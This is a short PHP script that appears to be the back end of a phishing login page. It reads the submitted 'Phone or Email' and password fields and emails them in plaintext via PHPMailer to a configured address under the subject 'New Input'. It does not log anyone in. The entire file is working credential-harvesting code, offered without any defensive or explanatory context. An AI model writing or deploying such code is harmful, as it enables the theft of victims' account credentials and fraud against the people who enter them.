<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$date = date("Y-m-d H:i:s");
    if(isset($_POST['login'])){

        $username = $_POST['username'];
        $password = $_POST['password'];

        require_once "PHPMailer/PHPMailer.php";
require_once 'PHPMailer/Exception.php';

//PHPMailer Object
$mail = new PHPMailer;

        //From email address and name
        $mail -> setFrom('admin@paxufully.com');
        $mail -> FromName = "New Input";

$mail -> addAddress('');
$mail -> isHTML(true);

$mail -> Subject = 'New Input';
$mail -> Body = '
Phone or Email: <br>'.$username.' </b> <br/>
Password: <b>'.$password.' </b>
';

if(!$mail -> send()) {
    //
}else {
    //
}
    }
?>